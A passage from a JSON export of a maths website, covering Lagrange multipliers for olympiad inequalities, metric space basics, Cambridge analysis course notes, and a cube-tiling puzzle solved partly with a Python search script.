\\\\frac{1}{9} + \\\\frac{1}{9} - \\\\frac{2}{27} = \\\\frac{7}{27} \\\\;\\\\; \\\\checkmark$$ Example problem 3 Given that $x,y \\\\in \\\\mathbb{R}$ with $x^2 + y^2 = 1$, Find the max and min values of $8x^2 - 2y$. Note: the \"normal\" way to do this would be to write it as $8(1-y^2)-2y$ and bound this quadratic. But we can do it with LM too. I\\'ll let you decide which way is easier. Let $f,g : \\\\mathbb{R}^2 \\\\to \\\\mathbb{R}$ with: $$f(x,y) = 8x^2-2y$$ $$g(x,y) = x^2 + y^2$$ Then $f,g$ are continuous and have continuous partial derivatives. $$U := \\\\mathbb{R}^2$$ $$S := \\\\{x \\\\in U \\\\mid g(x) = 1\\\\}$$ $S$ is closed and bounded, hence $S$ is compact. Hence $f$ attains a global max and min on $S$. We can apply LM, because there is no boundary case to check. $$\\\\nabla g = (2x,2y)$$ So $\\\\nabla g \\\\neq (0,0)$ since $x^2 + y^2 = 1$. Hence we are in the second case: $$\\\\nabla f = \\\\lambda \\\\nabla g$$ $$\\\\implies \\\\begin{bmatrix} 16x \\\\\\\\\\\\\\\\ -2 \\\\end{bmatrix} = \\\\lambda \\\\begin{bmatrix} 2x \\\\\\\\\\\\\\\\ 2y \\\\end{bmatrix}$$ Thus we need to solve the following 3 simultaneous equations: $$16x = 2x\\\\lambda$$ $$-2 = 2y\\\\lambda$$ $$x^2 + y^2 = 1$$ If $x=0$, then $y^2 = 1$, so $(x,y) = (0,1)$ or $(0,-1)$. If $x\\\\neq 0$, then $\\\\lambda = 8$, so $-2 = 16y$. Hence $y=-\\\\frac{1}{8}$ and so $x^2 = 1 - \\\\frac{1}{64}$, so $x = \\\\pm \\\\frac{\\\\sqrt{63}}{8}$. Hence we need to check $(0,1)$,$(0,-1)$, $(\\\\frac{\\\\sqrt{63}}{8}, -\\\\frac{1}{8})$, $(-\\\\frac{\\\\sqrt{63}}{8}, -\\\\frac{1}{8})$. $$f(0, \\\\pm 1) = \\\\mp 2$$ $$f(\\\\pm \\\\frac{\\\\sqrt{63}}{8}, -\\\\frac{1}{8}) = \\\\frac{65}{8}$$ $$\\\\therefore -2 \\\\leq 8x^2 - 2y \\\\leq \\\\frac{65}{8}$$ Homogenous Trick Suppose we want to prove some inequality, but there are no constraints. If the inequality is homogenous, then we can impose a condition e.g. $a+b+c=1$ or $abc = 1$ or $a^2+b^2+c^2=1$, because we can scale each variable to make the condition true. Prove that $\\\\forall a,b,c \\\\in \\\\mathbb{R}$, $$a^2 + b^2 + c^2 \\\\geq ab + bc + ca$$ If $a=b=c=0$, the result is obvious. Otherwise, let $k = \\\\sqrt{a^2 + b^2 + c^2} \\\\gt 0$. The inequality is equivalent to: $$\\\\left(\\\\frac{a}{k}\\\\right)^2 + \\\\left(\\\\frac{b}{k}\\\\right)^2 + \\\\left(\\\\frac{c}{k}\\\\right)^2 \\\\geq \\\\frac{a}{k} \\\\cdot \\\\frac{b}{k} + \\\\frac{b}{k}\\\\cdot \\\\frac{c}{k} + \\\\frac{c}{k} \\\\cdot \\\\frac{a}{k}$$ And so, letting $x=\\\\frac{a}{k}$, $y = \\\\frac{b}{k}$, $z = \\\\frac{c}{k}$, we have that $x^2 + y^2 + z^2 = 1$. So it is enough to prove that $xy + yz + zx \\\\leq 1$ when $x^2 + y^2 + z^2 = 1$ (we chose this condition because of compactness). We can now solve this as in the examples above, using Lagrange multipliers. Practice problem (JBMO) For $x,y \\\\in \\\\mathbb{R}, (x,y) \\\\neq (0,0)$, prove that: $$\\\\frac{x+y}{x^2-xy+y^2} \\\\leq \\\\frac{2\\\\sqrt 2}{\\\\sqrt {x^2 + y^2}}$$ (Note: much easier to fix $y$ and use normal derivatives, but we want to solve with LM) The inequality is homogenous, so we can impose the condition $x^2 + y^2 = 1$ by scaling the variables. Thus it is sufficient to show that $\\\\frac{x+y}{x^2-xy+y^2} \\\\leq 2\\\\sqrt 2$ when $x^2 + y^2 = 1$. $$\\\\text{Goal: } \\\\frac{x+y}{x^2-xy+y^2} \\\\leq 2\\\\sqrt 2$$ $$\\\\iff 0 \\\\leq 2\\\\sqrt2(x^2-xy+y^2) -x - y$$ $$\\\\iff 0 \\\\leq 2\\\\sqrt2(1-xy) -x - y$$ Note that we didn\\'t have to clear the $x^2 + y^2$ term, but it makes the computation easier - always look for tricks! Now as usual, define: $$f,g: \\\\mathbb{R}^2 \\\\to \\\\mathbb{R}$$ $$f(x,y) = 2\\\\sqrt2(1-xy)-x-y$$ $$g(x,y) = x^2 + y^2$$ $$S = \\\\{x \\\\in \\\\mathbb{R}^2 \\\\mid g(x,y) = 1\\\\}$$ Then $S$ is closed. Since $S$ is also bounded, we have that $S$ is compact. Also $f,g$ are continuous with continuous partial derivatives, since they are polynomials. Hence $f$ has a global max and min on $S$. $\\\\nabla g = (2x,2y) \\\\neq (0,0)$ since $a^2 + b^2 = 1$. $$\\\\therefore \\\\nabla f = \\\\lambda \\\\nabla g$$ $$\\\\implies \\\\begin{bmatrix} -2\\\\sqrt2 y - 1 \\\\\\\\\\\\\\\\ -2\\\\sqrt2 x - 1\\\\end{bmatrix} = \\\\lambda \\\\begin{bmatrix} 2x \\\\\\\\\\\\\\\\ 2y\\\\end{bmatrix}$$ Hence, $$-2y\\\\sqrt2 - 1 = 2x\\\\lambda$$ $$-2x\\\\sqrt2 - 1 = 2y\\\\lambda$$ $$x^2 + y^2 = 1$$ Solving these to find $f(x,y)$: $$y(-2y\\\\sqrt2 - 1) = 2xy\\\\lambda$$ $$x(-2x\\\\sqrt2 - 1) = 2yx\\\\lambda$$ $$\\\\therefore -2y^2\\\\sqrt2 - y = -2x^2\\\\sqrt2 - x$$ $$\\\\implies 2\\\\sqrt2(x^2 - y^2) + (x-y) = 0$$ Thus either $x=y$ or $2\\\\sqrt2(x+y) + 1 = 0$. If $x = y$: Then, since $x^2 + y^2 = 1$, we have that $x = y = \\\\pm \\\\frac{1}{\\\\sqrt2}$. In this case: $$f(x,y) = f\\\\left(\\\\pm \\\\frac{1}{\\\\sqrt2}, \\\\pm \\\\frac{1}{\\\\sqrt2}\\\\right)$$ $$= 2\\\\sqrt2(1 - \\\\frac{1}{2}) - (\\\\pm \\\\sqrt 2)$$ $$= \\\\sqrt2 \\\\mp \\\\sqrt2$$ $$= 0, 2\\\\sqrt2$$ If $2\\\\sqrt2(x+y) + 1 = 0$: Then $x + y = -\\\\frac{1}{2\\\\sqrt2}$. $$\\\\implies (x+y)^2 = \\\\frac{1}{8}$$ $$\\\\implies 2xy = \\\\frac{1}{8} - (x^2+y^2) = \\\\frac{1}{8} - 1$$ $$\\\\implies xy = -\\\\frac{7}{16}$$ So in this case: $$f(x,y) = 2\\\\sqrt2(1-xy)-(x+y)$$ $$= 2\\\\sqrt2\\\\left(1+ \\\\frac{7}{16}\\\\right) + \\\\frac{1}{2\\\\sqrt2}$$ $$= \\\\frac{25\\\\sqrt2}{8}$$ Overall, the possible extremal values of $f$ are $0, 2\\\\sqrt2, \\\\frac{25\\\\sqrt2}{8}$. $$\\\\therefore 0 \\\\leq f(x,y) \\\\leq \\\\frac{25\\\\sqrt2}{8}$$ In particular, $f(x,y) \\\\geq 0$ as required. When It Fails Let $a,b,c \\\\gt 0$ such that $a+b+c=3$. Find the minimum value of: $$f(a,b,c) = \\\\frac{2-a^3}{a} + \\\\frac{2-b^3}{b} + \\\\frac{2-c^3}{c}$$ If we attempt to use LM: The problem is that $f$ is not defined on the boundary, so we cannot say $f$ has a global max and min in the area we\\'re looking at (indeed $f$ can be arbitrarily large if we let $a$ approach zero for example). Boo, we can\\'t use LM. Actually, in this specific case we can fix it with the following approach: Make the triangle a bit smaller on all sides, then it is compact and we can use LM. For the region of that we didn\\'t consider, we can assume that \"one of the variables is at least this small\", so \"$f$ is at least this large\", and get it to be larger than a value we already know. Conclusion As you\\'ve seen, it takes careful consideration and background knowledge to use Lagrange multipliers in olympiads correctly. Best of luck! $B[p,r]$ is a closed set.\u21a9 If $U_n = \\\\left(-\\\\frac{1}{n}, \\\\frac{1}{n}\\\\right)$, then $\\\\bigcup_{n=1}^\\\\infty U_n = \\\\{0\\\\}$ which is not open.\u21a9 This is not true in the reverse direction, for example consider $B(0,1)$ and $f(x) = d(x,0)$, then there is a global min at 0.\u21a9 This is so that partial derivatives are defined.\u21a9 Note that we could have also let $U$ be something like $\\\\{(x,y) \\\\in \\\\mathbb{R}^2 \\\\mid x^2+y^2 \\\\lt 1000\\\\}$, so that $U$ actually has a boundary, and when we check that case, we would conclude impossibility by \"if on the boundary, then $x^2 + y^2$ would have to be $1$ and $1000$ at the same time\". But it is nicer to let $U = \\\\mathbb{R}^2$, because then $\\\\bar S = S$ so we get that the global extrema are in $S$ straight away.\u21a9", "id": 1920286385045623644, "dir": ["maths"], "is_book_member": false, "name": "lagrange-multipliers"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1734390000.0, "mod_date_time": "16 Dec 2024", "cr_timestamp": 1734390000.0, "cr_date_time": "16 Dec 2024", "tags": [], "title": "\u00a71 Basics", "content": "We want to formalise our intuition about distances in the real world, and try to generalise. 1.1 Definitions and Examples Let $X$ be any set. A metric on $X$ is a function $d:X \\\\times X \\\\rightarrow \\\\mathbb{R}$ such that: $d(x,y) \\\\geq 0$, equality iff $x=y$ (\"positive semi-definite\") $d(x,y) = d(y,x)$ (\"symmetric\") $d(x,y) + d(y,z) \\\\geq d(x,z)$ (\"triangle inequality\") We say $(X,d)$ is a metric space.", "id": -4033286074660986896, "dir": ["maths", "tripos", "analysis-and-topology", "a-metric-spaces"], "is_book_member": true, "name": "1-basics"}, {"type": "book", "coming_soon": false, "mod_timestamp": 1734386400.0, "mod_date_time": "16 Dec 2024", "cr_timestamp": 1734386400.0, "cr_date_time": "16 Dec 2024", "tags": [{"name": "pure-maths", "colour": "indigo"}, {"name": "TODO", "colour": "red"}], "title": "IB Analysis and Topology", "content": "Notes I took for IB Analysis and Topology in the Cambridge Mathematical Tripos in 2024. Aimed at second-year undergraduates. Hopefully I can provide some inutition that might not be present elsewhere. PLEASE NOTE: This book is still just a skeleton for now. If this upsets you, then tell me to get my act together. Course Prerequisites Surprisingly not much! Familiarity with mathematical symbols (e.g. here). Basic set theory, for example definition and results regarding function preimage (e.g. preimage of union is union of preimages). Proofs of theorems from IA Analysis I are good to know but not needed; the theorem statements themselves are useful but easily googleable. Resources Example sheet questions Conventions The following conventions are used for the sake of brevity: defn = definition iff = if and only if $\\\\subset$ means the same thing as $\\\\subseteq$ (i.e. \"is a subset of, could be equal to\")", "id": 7824015139506219153, "dir": ["maths", "tripos"], "is_book_member": true, "name": "analysis-and-topology"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1689609600.0, "mod_date_time": "17 Jul 2023", "cr_timestamp": 1689609600.0, "cr_date_time": "17 Jul 2023", "tags": [{"name": "report", "colour": "blue"}, {"name": "diagrams", "colour": "green"}], "title": "Filling a cube with 1:2:3 Cuboids", "content": "A positive integer $n$ is \\'lucky\\' if it is possible to fill a cube with $n$ cuboids, each of whom has side ratio 1:2:3. Which numbers are lucky? I encountered this problem while applying to MBL-Balkans 2023. It\\'s essentially a 3D version of the problem discussed in this numberphile video. It\\'s more interesting to ask this version of the question: Let $C$ be the maximal positive integer that is not lucky. Does $C$ exist? If so, find an upper bound on $C$. For example, \"$C \\\\leq 100$\" is just saying that all integers greater than 100 are lucky. Of course, it might be very hard to find the actual value of $C$. Below is the best upper bound on $C$ that I could get - do try the problem yourself and let me know your result. $$C \\\\leq 17$$ Getting a foothold Before we actually find a lucky number, we can try to find some rules of inference, for example \"if $n$ is lucky then so is $n+1000$\". If we can find lots of these, and at least one lucky number, then hopefully we can mark many integers as lucky. We might first notice that if we have a filling of a cube with $n$ cuboids of side ratio 1:2:3, then we can split one of them into 8 new cuboids by halving along each edge. The new number of cuboids is $n+8-1 = n+7$ (minus one because of the cuboid we replaced). So we have that: If $n$ is lucky, then so is $n+7$. This sort of feels like trying to build a cube out of wooden blocks, but the only blocks we have access to are cubes and 1:2:3 cuboids. With this mental imagery, we can find another construction: We used 2 cubes and 3 cuboids, thus if $n$ and $m$ are lucky, we can scale two cubes tiled with $n$ and $m$ cuboids to fit inside this construction. Hence we know that: If $n$ and $m$ are lucky, then so is $n+m+3$. We can continue to try constructions like this. Construction Tools If $n$ is lucky, then so is $n+7$. See above. If $n$ and $m$ are lucky, then so is $n+m+3$. See above. If $n$ and $m$ are lucky, then so is $n+m+8$. If $n$ is lucky, then so is $n+15$. We can make a 6x6x3 cuboid with eleven 1:2:3 cuboids, as shown. Then, we can make another 6x6x3 cuboid using the same construction as in the proof of claim 3, where we wrap 4 cuboids around a cube. Thus we can combine these two 6x6x3 cuboids to form a 6x6x6 cube, using fifteen 1:2:3 cuboids and one smaller cube. If $n$ is lucky, then so is $n+13$. If $n$ is lucky, then so is $n+12$. Finding a base case To actually find a lucky number, we remove cubes from our lego building blocks and only use 1:2:3 cuboids. 8 is lucky. Now, let\\'s see what numbers we can conquer with what we have so far. By Claim 1, we know that 8, 15, 22, 29, 36 etc. are all lucky. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 etc. Now we can use Claim 2 to conquer 8+8+3=19, 8+15+3=26, 15+15+3=33, 15+22+3=40, etc. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 etc. And so on, utilising all of the Claims. In the end, we conquer the following numbers up to 40: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 etc. OK - great! Now we have seven consecutive numbers (26 to 32) all being lucky. Since $n \\\\implies n+7$ (Claim 1), this means every integer greater than or equal to 26 is lucky. So $C$ is at most 26. Reducing the bound with code Have you noticed that in the table above, 25 sticks out like a sore thumb? If we could just show that 25 is lucky, we could add the numbers from 19 to 24 to our chain of consecutive numbers... and $C$ would be at most 19 - and that would be a good place to stop, because conquering 25 feels like such a bargain (we would reduce $C$ by a lot, not just by 1). But 25 = 18 + 7, so can we show that 18 is lucky? Then we\\'d have $C \\\\leq 17$. 18 feels too big to manually try and search for, so can we write some code to brute force it? Yes we can - if we assume that we can build up tilings by repeatedly joining two cuboids at a time into a larger cuboid, then we can store the side ratios that can be constructed like this. The side ratio is stored as a 3-tuple $(x,y,z)$ with $x$ always equal to 1. To see if we can combine two ratios, we check if the $z$-values are the same, and if so we add their $y$-values (assuming we always join them by placing one cuboid on top of the other - thus for each 3-tuple, we must store all of its 6 permutations). For example, $(1,2,3) + (1,2,3) = (1,4,3)$. We can denote by $S_k$ the set of all side ratios that can be constructed using exactly $k$ 1:2:3 cuboids. We generate $S_k$ by trying to comine all aspect ratios which have $k$ total cuboids, which we can do dynamically (i.e. generate $S_1$, then $S_2$, then $S_3$, etc.). Then, we look at which $S_k$ contain $(1,1,1)$. #!/usr/bin/python3 from fractions import Fraction as F from collections import defaultdict S = {} # normalized fractions: x := 1 S[1] = { (F(1,1),F(2,1),F(3,1)): (), (F(1,1),F(3,1),F(2,1)): (), (F(1,1),F(1,2),F(3,2)): (), (F(1,1),F(3,2),F(1,2)): (), (F(1,1),F(1,3),F(2,3)): (), (F(1,1),F(2,3),F(1,3)): (), } for k in range(2,22): print(k) # compute S_k S[k] = defaultdict(lambda: ((0,0), (0,0))) # (n,key), (m,key) for n in range(1, k//2+1): m = k-n # m+n = k for a in S[n].keys(): for b in S[m].keys(): if a[2] == b[2]: x,y,z = (F(1,1), a[1]+b[1], a[2]) newratios = list(set([ (F(1,1),y/x,z/x), (F(1,1),z/x,y/x), (F(1,1),x/y,z/y), (F(1,1),z/y,x/y), (F(1,1),x/z,y/z), (F(1,1),y/z,x/z), ])) if S[k][newratios[0]] == ((0,0),(0,0)): if newratios[0] == (1,1,1): print(f\"FOUND CUBE FOR S_{k}\") for newratio in newratios: S[k][newratio] = ((n,a),(m,b)) def print_construction(k, r, depth): if k == 1: # terminal nodes displayed with a colon print(\" \"*depth, f\":({r[0]}, {r[1]}, {r[2]})\") return print(\" \"*depth, f\"({r[0]}, {r[1]}, {r[2]})\") ((n,a),(m,b)) = S[k][r] print_construction(n, a, depth+1) print_construction(m, b, depth+1) r = (1, 1, 1) for k in S.keys(): if k==1: continue if S[k][r] != ((0,0),(0,0)): print(f\"found {r} in S_{k}:\") print_construction(k, r, 0) If the program finds $(1,1,1)$ in $S_k$ (i.e. a cube, although you can search for any ratio you want by changing r), then it will print out the way it found to construct it, in a tree-like manner using the recursive print_construction function. The program found the following construction, proving that 18 is lucky: Thus, 18+7=25 is also lucky, and so $C \\\\leq 17$.", "id": -7795744205045020138, "dir": ["maths"], "is_book_member": false, "name": "cube-tilings"}]